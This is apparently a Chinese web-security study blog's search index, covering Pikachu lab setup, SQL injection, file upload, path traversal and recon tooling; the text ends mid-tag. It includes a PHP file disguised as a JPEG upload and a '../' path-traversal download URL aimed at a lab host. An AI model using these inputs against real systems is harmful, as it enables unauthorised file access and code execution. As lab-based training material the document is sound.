<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web安全日志-013</title>
      <link href="/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/"/>
      <url>/2023/09/26/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-013/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-012</title>
      <link href="/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/"/>
      <url>/2023/09/25/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-012/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-011</title>
      <link href="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/"/>
      <url>/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-必懂知识点"><a href="#WEB漏洞-必懂知识点" class="headerlink" title="WEB漏洞-必懂知识点"></a><font size="6"><strong>WEB漏洞-必懂知识点</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言:本章节将讲解各种WEB层面上的有那些漏洞类型,俱体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容!<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/1.png"></p><p>简要知识点</p><pre class=" language-bash"><code class="language-bash">CTE,SRc，红蓝对抗，实战等<span class="token comment" spellcheck="true">#简要说明以上漏洞危害情况</span><span class="token comment" spellcheck="true">#简要说明以上漏洞等级划分</span><span class="token comment" spellcheck="true">#简要说明以上漏洞重点内容</span><span class="token comment" spellcheck="true">#简要说明以上漏洞形势问题</span></code></pre><h3 id="二、pikachu环境搭建"><a href="#二、pikachu环境搭建" class="headerlink" title="二、pikachu环境搭建"></a><font size="5"><strong>二、pikachu环境搭建</strong></font></h3><p>靶场搭建：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>docker环境</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull area39/pikachu</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -d -p8080:80 area39/pikachu</span>72ddd9a05d31fdb921765519c413f3f97dbb34560c9c14d9aa59de73e5d6b3eb</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/2.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/3.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/4.png"></p><h3 id="三、sql注入之数字注入"><a href="#三、sql注入之数字注入" class="headerlink" title="三、sql注入之数字注入"></a><font size="5"><strong>三、sql注入之数字注入</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/5.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/6.png"><br>在数据库中查看信息</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member<span class="token punctuation">;</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex  <span class="token operator">|</span> phonenum    <span class="token operator">|</span> address               <span class="token operator">|</span> email             <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 18626545453 <span class="token operator">|</span> chain                 <span class="token operator">|</span> vince@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> allen    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676767767 <span class="token operator">|</span> nba 76                <span class="token operator">|</span> allen@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> kobe     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 15988767673 <span class="token operator">|</span> nba lakes             <span class="token operator">|</span> kobe@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> grady    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676765545 <span class="token operator">|</span> nba hs                <span class="token operator">|</span> grady@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> kevin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13677676754 <span class="token operator">|</span> Oklahoma City Thunder <span class="token operator">|</span> kevin@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> lucy     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 12345678922 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lucy@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> lili     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 18656565545 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lili@pikachu.com  <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</code></pre><p>操作方法<br>● 在文件&#x2F;app&#x2F;vul&#x2F;sqli&#x2F;sqli_id.php第27行下面增加一行 echo $query; 然后保存退出</p><pre class=" language-bash"><code class="language-bash">27 <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select username,email from member where id=<span class="token variable">$id</span>"</span><span class="token punctuation">;</span>28  <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/7.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/8.png"><br>打开burp修改数据包<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/9.png"><br>获取到数据库信息<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/10.png"></p><h3 id="四、文件遍历漏洞"><a href="#四、文件遍历漏洞" class="headerlink" title="四、文件遍历漏洞"></a><font size="5"><strong>四、文件遍历漏洞</strong></font></h3><p>创建文件dir.php</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># vim dir.php</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># cat dir.php</span><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>@<span class="token variable">$handle</span> <span class="token operator">=</span> opendir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$file <span class="token operator">=</span> readdir<span class="token punctuation">(</span>$handle<span class="token punctuation">))</span></span> <span class="token operator">!=</span><span class="token operator">=</span> false<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        if<span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">".."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                                if<span class="token punctuation">(</span>is_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; //如果是子文件夹，进行递归</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token punctuation">]</span> <span class="token operator">=</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        closedir<span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">return</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>my_dir<span class="token punctuation">(</span><span class="token string">"../app"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># chmod +x dir.php</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/11.png"><br>备注：目录遍历漏洞一般由其他的漏洞配合才能实现漏洞的作用。</p><h3 id="五、文件上传漏洞"><a href="#五、文件上传漏洞" class="headerlink" title="五、文件上传漏洞"></a><font size="5"><strong>五、文件上传漏洞</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/12.png"></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># cat phpinfo.jpg                                                                                                                                                                     2 ⚙</span><span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/13.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/14.png"><br>注意：文件上传一般是高危漏洞，因为要是上传的是木马文件可以直接拿下服务器。</p><p>五、文件下载漏洞<br>右击复制下载地址：<a href="http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/15.png"><br>在网站目录中查看</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># pwd</span>/app/vul/unsafedownload/downloadroot@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># ls</span>ai.png  bigben.png  camby.png  kb.png  lmx.png  mbl.png  ns.png  oldfish.png  pj.png  rayal.png  sks.png  smallane.png</code></pre><p>修改下载文件</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename<span class="token operator">=</span><span class="token punctuation">..</span>/unsafedownload.php</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/16.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-010</title>
      <link href="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/"/>
      <url>/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-资产监控拓展"><a href="#信息收集-资产监控拓展" class="headerlink" title="信息收集-资产监控拓展"></a><font size="6"><strong>信息收集-资产监控拓展</strong></font></h2><span id="more"></span><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Github监控</span>  便于收集整理最新exp或poc  便于发现相关测试目标的资产<span class="token comment" spellcheck="true"># 各种子域名查询</span><span class="token comment" spellcheck="true"># DNS,备案,证书</span><span class="token comment" spellcheck="true"># 全球节点请求cdn</span>  枚举爆破或解析子域名对应  便于发现管理员相关的注册信息<span class="token comment" spellcheck="true">#黑暗引擎相关搜索</span>    fofa, shodan, zoomeye  <span class="token comment" spellcheck="true">#微信公众号接口获取</span><span class="token comment" spellcheck="true"># 内部群内部资源</span></code></pre><h3 id="一、GitHub项目监控"><a href="#一、GitHub项目监控" class="headerlink" title="一、GitHub项目监控"></a><font size="5"><strong>一、GitHub项目监控</strong></font></h3><p>server酱：<a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br>GitHub项目监控地址：<a href="https://github.com/weixiao9188/wechat_push">https://github.com/weixiao9188/wechat_push</a></p><h4 id="1、监控最新的EXP发布及其他"><a href="#1、监控最新的EXP发布及其他" class="headerlink" title="1、监控最新的EXP发布及其他"></a><font size="4"><strong>1、监控最新的EXP发布及其他</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Title: wechat push CVE-2020</span><span class="token comment" spellcheck="true"># Date: 2020-5-9</span><span class="token comment" spellcheck="true"># Exploit Author: weixiao9188</span><span class="token comment" spellcheck="true"># Version: 4.0</span><span class="token comment" spellcheck="true"># Tested on: Linux,windows</span><span class="token comment" spellcheck="true"># coding:UTF-8</span><span class="token function">import</span> requests<span class="token function">import</span> json<span class="token function">import</span> <span class="token function">time</span><span class="token function">import</span> os<span class="token function">import</span> pandas as pdtime_sleep <span class="token operator">=</span> 20 <span class="token comment" spellcheck="true">#每隔20秒爬取一次</span>while<span class="token punctuation">(</span>True<span class="token punctuation">)</span>:    headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token string">"User-Agent"</span><span class="token keyword">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token comment" spellcheck="true">#判断文件是否存在</span>    datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    response1<span class="token operator">=</span>None    response2<span class="token operator">=</span>None    <span class="token keyword">if</span> os.path.exists<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span><span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#如果文件存在则每次爬取10个</span>        <span class="token function">df</span> <span class="token operator">=</span> pd.read_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>, header<span class="token operator">=</span>None<span class="token punctuation">)</span>        datas <span class="token operator">=</span> df.where<span class="token punctuation">(</span>df.notnull<span class="token punctuation">(</span><span class="token punctuation">)</span>,None<span class="token punctuation">)</span>.values.tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将提取出来的数据中的nan转化为None</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    else:        <span class="token comment" spellcheck="true">#不存在爬取全部</span>        datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    data1 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response1.text<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response2.text<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span>,data2<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>:        <span class="token keyword">for</span> i <span class="token keyword">in</span> j:            s <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"name":i['name'],"html":i['html_url'],"description":i['description']&amp;#125;</span>            s1 <span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'html_url'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> s1 not <span class="token keyword">in</span> datas:                <span class="token comment" spellcheck="true">#print(s1)</span>                <span class="token comment" spellcheck="true">#print(datas)</span>                params <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                     <span class="token string">"text"</span>:s<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>,                    <span class="token string">"desp"</span><span class="token keyword">:</span><span class="token string">" 链接:"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>+<span class="token string">"\n简介"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                print<span class="token punctuation">(</span><span class="token string">"当前推送为"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>+<span class="token string">"\n"</span><span class="token punctuation">)</span>                print<span class="token punctuation">(</span>params<span class="token punctuation">)</span>                requests.get<span class="token punctuation">(</span><span class="token string">"https://sc.ftqq.com/XXXX.send"</span>,params<span class="token operator">=</span>params,timeout<span class="token operator">=</span>10<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#time.sleep(1)#以防推送太猛</span>                print<span class="token punctuation">(</span><span class="token string">"推送完成!"</span><span class="token punctuation">)</span>                datas.append<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>            else:                pass                <span class="token comment" spellcheck="true">#print("数据已处在!")</span>    pd.DataFrame<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>.to_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>,header<span class="token operator">=</span>None,index<span class="token operator">=</span>None<span class="token punctuation">)</span>    time.sleep<span class="token punctuation">(</span>time_sleep<span class="token punctuation">)</span></code></pre><h4 id="常见的子域名收集方法"><a href="#常见的子域名收集方法" class="headerlink" title="常见的子域名收集方法"></a><font size="4"><strong>常见的子域名收集方法</strong></font></h4><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/2.png"></p><h3 id="二、黑暗引擎使用"><a href="#二、黑暗引擎使用" class="headerlink" title="二、黑暗引擎使用"></a><font size="5"><strong>二、黑暗引擎使用</strong></font></h3><p>fofa:<a href="https://fofa.so/">https://fofa.so/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/3.png"><br>zoomeye:<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/4.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://crt.sh/">https://crt.sh</a><br><a href="https://dnsdb.io/">https://dnsdb.io</a><br><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br><a href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-009</title>
      <link href="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/"/>
      <url>/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-APP及其他资产等"><a href="#信息收集-APP及其他资产等" class="headerlink" title="信息收集-APP及其他资产等"></a><font size="6"><strong>信息收集-APP及其他资产等</strong></font></h2><span id="more"></span><h3 id="一、bp抓取手机数据包"><a href="#一、bp抓取手机数据包" class="headerlink" title="一、bp抓取手机数据包"></a><font size="5"><strong>一、bp抓取手机数据包</strong></font></h3><p>手机IP地址：192.168.1.3<br>kali：192.168.1.9</p><p>burp配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/1.png"><br>手机配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/2.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/3.png"><br>配置证书<br>在浏览器中输入192.168.1.9:8888下载证书并重名为ca.cer 然后导入<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/4.png"><br>导入证书：设置-密码与安全-系统安全-加密与凭证-从sd卡安装-然后搜索ca.cer<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/5.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/6.png"></p><h3 id="二、对抓取的数据包进行分析"><a href="#二、对抓取的数据包进行分析" class="headerlink" title="二、对抓取的数据包进行分析"></a><font size="5"><strong>二、对抓取的数据包进行分析</strong></font></h3><p>通过对抓取到的数据包进行分析、数据包上面可能有域名有ip地址。对上面的数据包进行信息收集、借助shodan、钟馗之眼、fofa等工具进行端口扫描<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/7.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/8.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/9.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://fofa.so/">https://fofa.so/</a><br><a href="http://tool.chinaz.com/">http://tool.chinaz.com</a><br><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="https://nmap.org/download.html">https://nmap.org/download.html</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a> 子域名查询<br><a href="https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw">https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw</a> 提取码：k5se</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-008</title>
      <link href="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/"/>
      <url>/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-架构-搭建-WAF等"><a href="#信息收集-架构-搭建-WAF等" class="headerlink" title="信息收集-架构,搭建,WAF等"></a><font size="6"><strong>信息收集-架构,搭建,WAF等</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="*一、前言知识"></a><font size="5">*<strong>一、前言知识</strong></font></h3><p>前言：在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/1.png"></p><h3 id="二、站点搭建分析"><a href="#二、站点搭建分析" class="headerlink" title="二、站点搭建分析"></a><font size="5"><strong>二、站点搭建分析</strong></font></h3><h4 id="1、搭建习惯-目录型站点"><a href="#1、搭建习惯-目录型站点" class="headerlink" title="1、搭建习惯-目录型站点"></a><font size="4"><strong>1、搭建习惯-目录型站点</strong></font></h4><pre class=" language-bash"><code class="language-bash">简单的理解就是主站上面存在其他的cms程序例如：    学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs 我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</code></pre><h4 id="2、搭建习惯-端口类站点"><a href="#2、搭建习惯-端口类站点" class="headerlink" title="2、搭建习惯-端口类站点"></a><font size="4"><strong>2、搭建习惯-端口类站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/2.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/3.png"><br>有的站点不是使用的是默认的站点80而是其他的端口、可以使用shodan这种工具去收集端口</p><h4 id="3、搭建习惯-子域名站点"><a href="#3、搭建习惯-子域名站点" class="headerlink" title="3、搭建习惯-子域名站点"></a><font size="4"><strong>3、搭建习惯-子域名站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/4.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/5.png"><br>备注：现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p><h4 id="4、搭建习惯-类似域名站点"><a href="#4、搭建习惯-类似域名站点" class="headerlink" title="4、搭建习惯-类似域名站点"></a><font size="4"><strong>4、搭建习惯-类似域名站点</strong></font></h4><p>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换<br>可以通过他的旧的域名找到一些突破口<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/6.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/7.png"><br>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</p><h4 id="5、搭建习惯-旁注-c段站点"><a href="#5、搭建习惯-旁注-c段站点" class="headerlink" title="5、搭建习惯-旁注,c段站点"></a><font 